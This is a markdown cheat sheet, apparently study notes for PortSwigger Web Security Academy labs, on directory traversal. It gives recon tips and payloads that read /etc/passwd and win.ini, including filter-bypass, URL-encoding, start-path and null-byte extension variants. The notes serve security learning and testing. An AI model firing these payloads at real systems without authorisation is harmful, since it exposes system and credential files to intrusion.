# Directory Traversal

## Summary

* [Recon for Directory Traversal Vulnerabilities](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

<br>

## Resources

* https://portswigger.net/web-security/file-path-traversal
* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include

<br>

## Recon

### Identify Directory Traversal

* Identify any application functionality that is likely to involve retrieval of data from a server’s filesystem.


* Look for any input fields that reference a file or directory name, or that contain any file extensions. 

    * Example: ?file=test, ?item=test.html


* After identifying potential targets for directory traversal testing, we need to test every instance individually to determine if user controllable data is used to interact with the server filesystem in an unsafe way.

<br>

## Cheat Sheet

<br>

### No Defenses in place

* This is a basic payload that can be used to test for directory traversal vulnerabilities when the application doesn’t implement any input validation.  This payload will step up 3 directories to reach the filesystem root, then reference another common file depending on the operating system in use.

```bash 
../../../etc/passwd
```
```bash
../../../windows/win.ini
```

<br><br>
**Many applications that place user input in file paths implement some defenses against traversal attacks.  The following payloads include some techniques to use in order to bypass these defenses.**

<br><br>
### Non-recursive filtering bypass

* The application is filtering out the ../ characters, but not in a recursive manner:

```bash
....//....//....//etc/passwd   
```
```bash
..././..././..././etc/passwd
```

<br>

### Absolute path bypass

* This payload references the file directly without the use of the traversal sequences

```bash
/etc/passwd  
```

<br>

### Encoding bypass

* Double URL encode the following payload:

```bash
../../../etc/passwd
```

* Other variations of the above:

    * Double URL encode only the / character in ../ :

```bash
..%25%32%66
```

   * URL encode the / character ..%2f , then URL encode only the % character in ..%2f :

```bash
..%252f
```

<br><br>
**Burp Pro includes a Path Traversal fuzzing wordlist that has many variations of encoding sequences to use.**
<br><br>


### Validation of starting path bypass

* Sometimes the application requires that the supplied filename begins with a base folder.  We can include this base folder and add in the traversal sequences after it.

```bash
/var/www/images/../../../etc/passwd
```

<br>

### File extension validation bypass

* If the application requires that the filename must end with a certain file extension, we can inject a null byte to possibly terminate the file path before the required extension:

   * Other methods to bypass this - https://portswigger.net/web-security/file-upload#obfuscating-file-extensions 

```bash
../../../etc/passwd%00.png
```

<br><br><br>

### Pending to complete labs that are missing from cheat sheet:

* All labs in this category are completed and referenced in cheat sheet.
